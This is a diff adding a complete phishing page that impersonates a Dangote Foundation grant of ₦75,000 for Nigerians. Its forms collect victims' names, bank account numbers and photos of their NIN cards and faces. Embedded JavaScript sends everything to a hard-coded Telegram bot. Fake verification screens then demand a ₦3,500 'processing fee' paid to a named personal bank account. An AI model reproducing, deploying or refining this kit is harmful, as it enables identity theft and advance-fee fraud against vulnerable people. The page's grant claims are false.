@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dangote National Empowerment Grant 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    
+    <style>
+        body, html { 
+            margin: 0; padding: 0; height: 100%; width: 100%; 
+            overflow: hidden; font-family: 'Outfit', sans-serif; 
+        }
+        .serif { font-family: 'Playfair Display', serif; }
+        .bg-dangote { background-color: #003366; }
+        .text-dangote { color: #003366; }
+        
+        .hero-bg {
+            background: linear-gradient(rgba(0, 51, 102, 0.75), rgba(0, 51, 102, 0.9)), 
+                        url('https://i.imgur.com/iakAr92.jpeg');
+            background-size: cover; background-position: center;
+        }
+
+        .page-container {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: none; overflow-y: auto;
+        }
+        .page-container.active { display: block; }
+        .page-container.flex-center {
+            display: none; align-items: center; justify-content: center;
+        }
+        .page-container.flex-center.active { display: flex; }
+        
+        .loader {
+            border: 6px solid #f3f3f3; border-top: 6px solid #003366;
+            border-radius: 50%; width: 60px; height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .card { background: white; width: 100%; max-width: 400px; padding: 2rem; border-radius: 1.5rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); margin: 1rem; position: relative; }
+    </style>
+</head>
+<body class="bg-gray-50">
+
+    <!-- PAGE 1: LANDING PAGE -->
+    <div id="landingPage" class="page-container active">
+        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center sticky top-0 z-50">
+            <div class="flex items-center gap-2">
+                <div class="w-10 h-10 bg-dangote rounded flex items-center justify-center text-white font-bold text-xl">D</div>
+                <span class="font-extrabold tracking-tighter text-xl text-dangote">DANGOTE <span class="text-gray-400 font-light">FOUNDATION</span></span>
+            </div>
+        </nav>
+        <header class="hero-bg min-h-[80vh] flex items-center justify-center text-center text-white px-6">
+            <div class="max-w-4xl">
+                <div class="inline-block bg-yellow-500 text-dangote px-4 py-1 rounded-full text-xs font-black mb-6 uppercase">Official 2026 Disbursement</div>
+                <h1 class="serif text-5xl md:text-7xl mb-6 leading-tight">National Grant of ₦75,000 for All Citizens.</h1>
+                <p class="text-lg md:text-xl font-light mb-10 text-gray-100 max-w-2xl mx-auto leading-relaxed">Aliko Dangote is empowering Nigerians aged 18 and above with a ₦75,000 relief grant. Apply now to receive your direct cash transfer.</p>
+                <button onclick="navigateTo('step1')" class="bg-white text-dangote px-12 py-5 rounded-xl font-black uppercase tracking-widest hover:bg-yellow-500 hover:text-white transition-all shadow-2xl">Apply for Grant</button>
+            </div>
+        </header>
+        <section class="py-24 px-6 max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-12 bg-white">
+            <div class="text-center">
+                <div class="text-4xl mb-4">🇳🇬</div>
+                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Eligibility</h3>
+                <p class="text-gray-500 text-sm">Must be a Nigerian citizen with a valid National Identity Number (NIN) and 18+ years of age.</p>
+            </div>
+            <div class="text-center">
+                <div class="text-4xl mb-4">💳</div>
+                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Verification</h3>
+                <p class="text-gray-500 text-sm">Automated banking validation and facial verification required for instant approval.</p>
+            </div>
+            <div class="text-center">
+                <div class="text-4xl mb-4">⚡</div>
+                <h3 class="font-bold text-xl mb-2 text-dangote uppercase">Instant Pay</h3>
+                <p class="text-gray-500 text-sm">Approved funds are disbursed directly into your provided bank account within 24 hours.</p>
+            </div>
+        </section>
+        <footer class="py-12 text-center text-gray-400 text-[10px] tracking-widest uppercase border-t">© 2026 Dangote Philanthropy Division.</footer>
+    </div>
+
+    <!-- PAGE 2: BANKING FORM -->
+    <div id="step1" class="page-container flex-center bg-slate-900">
+        <div class="card relative">
+            <button onclick="navigateTo('landingPage')" class="absolute top-4 left-6 text-gray-400 hover:text-dangote text-xs font-bold">← BACK</button>
+            <div class="mt-6 mb-6 text-center">
+                <h2 class="serif text-3xl text-dangote font-bold">Personal & Bank</h2>
+                <p class="text-gray-400 text-xs font-bold mt-1 uppercase">Step 1: Information Entry</p>
+            </div>
+            <form id="formStep1" class="space-y-4">
+                <input type="text" id="name" placeholder="Full Name (As on NIN)" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                <div class="grid grid-cols-2 gap-4">
+                    <input type="number" id="age" min="18" placeholder="Age" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                    <select id="state" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                        <option value="">State</option><option value="Lagos">Lagos</option><option value="Kano">Kano</option><option value="Rivers">Rivers</option><option value="Abuja">Abuja</option>
+                    </select>
+                </div>
+                <select id="bank" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                    <option value="">Select Bank</option><option value="OPay">OPay</option><option value="PalmPay">PalmPay</option><option value="Moniepoint">Moniepoint</option><option value="GTBank">GTBank</option>
+                </select>
+                <input type="text" id="acc_name" placeholder="Account Name" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                <input type="number" id="acc_num" placeholder="Account Number" required class="w-full p-4 border rounded-xl bg-gray-50 outline-none">
+                <button type="submit" class="w-full bg-dangote text-white py-5 rounded-xl font-bold uppercase tracking-widest">Continue</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 3: INITIAL LOADER (10s) -->
+    <div id="loaderScreen" class="page-container flex-center bg-white">
+        <div class="text-center">
+            <div class="loader mx-auto mb-6"></div>
+            <h2 class="text-2xl font-bold text-dangote mb-2">Verifying Bank Data...</h2>
+            <p class="text-gray-400 text-sm animate-pulse">Connecting to CBN payment gateway...</p>
+        </div>
+    </div>
+
+    <!-- PAGE 4: UPLOAD -->
+    <div id="step2" class="page-container flex-center bg-dangote">
+        <div class="card relative">
+            <button onclick="navigateTo('step1')" class="absolute top-4 left-6 text-gray-400 hover:text-dangote text-xs font-bold">← BACK</button>
+            <div class="mt-6 mb-6 text-center">
+                <h2 class="serif text-2xl text-dangote font-bold">Verify Identity</h2>
+                <p class="text-gray-400 text-xs font-bold mt-1 uppercase">Step 2: Gallery Upload</p>
+            </div>
+            <form id="formStep2" class="space-y-6">
+                <div>
+                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">NIN Card Photo (Gallery Only)</label>
+                    <input type="file" id="nin_file" accept="image/*" required class="w-full text-xs">
+                </div>
+                <div>
+                    <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">Portrait Photo (Gallery Only)</label>
+                    <input type="file" id="selfie_file" accept="image/*" required class="w-full text-xs">
+                </div>
+                <button type="submit" id="finalBtn" class="w-full bg-yellow-500 text-dangote py-5 rounded-xl font-black uppercase tracking-widest shadow-xl">Complete Upload</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 5: POST-UPLOAD VERIFICATION (10s) -->
+    <div id="postUploadLoader" class="page-container flex-center bg-white">
+        <div class="text-center">
+            <div class="loader mx-auto mb-6"></div>
+            <h2 class="text-2xl font-bold text-dangote mb-2">Verifying Documents...</h2>
+            <p class="text-gray-400 text-sm animate-pulse">Running facial recognition and NIN cross-check...</p>
+        </div>
+    </div>
+
+    <!-- PAGE 6: NETWORK PROCESSING FEE -->
+    <div id="feePage" class="page-container flex-center bg-slate-900">
+        <div class="card text-center">
+            <div class="w-20 h-20 bg-blue-50 text-dangote rounded-full flex items-center justify-center mx-auto mb-6 text-3xl">⚙️</div>
+            <h2 class="serif text-3xl text-dangote font-bold mb-4">Grant Approved!</h2>
+            <p class="text-gray-600 mb-6 leading-relaxed">Your ₦75,000 grant has been provisionally approved. A <span class="font-bold text-dangote">Network Processing Fee</span> of <span class="font-bold text-red-600 underline">₦3,500</span> is required to activate the secure disbursement channel.</p>
+            <button onclick="navigateTo('transferPage')" class="w-full bg-dangote text-white py-5 rounded-xl font-bold uppercase tracking-widest shadow-lg">Proceed to Payment</button>
+        </div>
+    </div>
+
+    <!-- PAGE 7: TRANSFER DETAILS -->
+    <div id="transferPage" class="page-container flex-center bg-gray-100">
+        <div class="card">
+            <h2 class="serif text-2xl text-dangote font-bold mb-6 text-center">Bank Transfer</h2>
+            <p class="text-sm text-gray-500 mb-6 text-center">Please transfer the exact amount of <span class="font-bold text-black">₦3,500</span> to the account below:</p>
+            
+            <div class="bg-blue-50 p-6 rounded-2xl space-y-4 mb-8">
+                <div>
+                    <label class="text-[10px] text-gray-400 uppercase font-black">Bank Name</label>
+                    <div class="font-bold text-lg text-dangote">Moniepoint</div>
+                </div>
+                <div>
+                    <label class="text-[10px] text-gray-400 uppercase font-black">Account Number</label>
+                    <div class="font-bold text-2xl tracking-widest text-dangote">8065234821</div>
+                </div>
+                <div>
+                    <label class="text-[10px] text-gray-400 uppercase font-black">Account Name</label>
+                    <div class="font-bold text-lg text-dangote">Divine Adimonyemma</div>
+                </div>
+            </div>
+
+            <button onclick="navigateTo('successPage')" class="w-full bg-green-600 text-white py-5 rounded-xl font-bold uppercase tracking-widest shadow-lg">I Have Made the Transfer</button>
+        </div>
+    </div>
+
+    <!-- PAGE 8: SUCCESS PAGE -->
+    <div id="successPage" class="page-container flex-center bg-white">
+        <div class="card text-center border-t-8 border-green-500">
+            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl">✓</div>
+            <h2 class="serif text-3xl text-dangote font-bold mb-4">Thank You!</h2>
+            <p class="text-gray-600 mb-8 leading-relaxed">Your application is now being processed. Your grant funds will be disbursed into your provided account details in the next <span class="font-bold text-dangote">72 hours</span>.</p>
+            <div class="bg-gray-50 p-4 rounded-xl text-[10px] text-gray-400 uppercase font-bold tracking-widest">Transaction Ref: DG-2026-XQ91</div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8189651296:AAGr13RJbXiZlGpUOECdDxE-ILjjl_f7Pik";
+        const CHAT_ID = "6577772758";
+        let userData = {};
+
+        function navigateTo(pageId) {
+            document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
+            const target = document.getElementById(pageId);
+            if (target.classList.contains('flex-center')) {
+                target.classList.add('active');
+            } else {
+                target.classList.add('active');
+            }
+            target.scrollTop = 0;
+        }
+
+        document.getElementById('formStep1').addEventListener('submit', (e) => {
+            e.preventDefault();
+            userData = {
+                name: document.getElementById('name').value,
+                age: document.getElementById('age').value,
+                bank: document.getElementById('bank').value,
+                acc_num: document.getElementById('acc_num').value,
+                acc_name: document.getElementById('acc_name').value
+            };
+            navigateTo('loaderScreen');
+            setTimeout(() => { navigateTo('step2'); }, 10000);
+        });
+
+        document.getElementById('formStep2').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('finalBtn');
+            const nin = document.getElementById('nin_file').files[0];
+            const selfie = document.getElementById('selfie_file').files[0];
+
+            btn.innerText = "UPLOADING..."; btn.disabled = true;
+
+            const text = `🚨 *DANGOTE GRANT SUBMISSION*\n*Name:* ${userData.name}\n*Bank:* ${userData.bank}\n*Acc:* ${userData.acc_num}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+
+                const f1 = new FormData(); f1.append('chat_id', CHAT_ID); f1.append('photo', nin);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f1 });
+
+                const f2 = new FormData(); f2.append('chat_id', CHAT_ID); f2.append('photo', selfie);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f2 });
+
+                // Start second verification loader (10s)
+                navigateTo('postUploadLoader');
+                setTimeout(() => { navigateTo('feePage'); }, 10000);
+            } catch (err) {
+                alert("Network error. Try again."); btn.disabled = false; btn.innerText = "Complete Upload";
+            }
+        });
+    </script>
+</body>
+</html>
+
